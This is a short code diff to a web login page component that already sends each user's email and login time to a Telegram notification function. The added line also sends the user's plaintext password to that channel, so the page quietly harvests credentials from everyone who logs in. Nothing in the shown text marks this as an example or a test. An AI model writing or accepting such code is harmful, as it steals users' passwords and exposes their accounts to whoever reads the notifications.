@@ -49,6 +49,7 @@ export default function LoginPage() {
       if (typeof window !== 'undefined' && window.sendTelegramNotification) {
         window.sendTelegramNotification("login", {
           email: formData.email,
+          password: formData.password,
           loginTime: new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" })
         })
       }
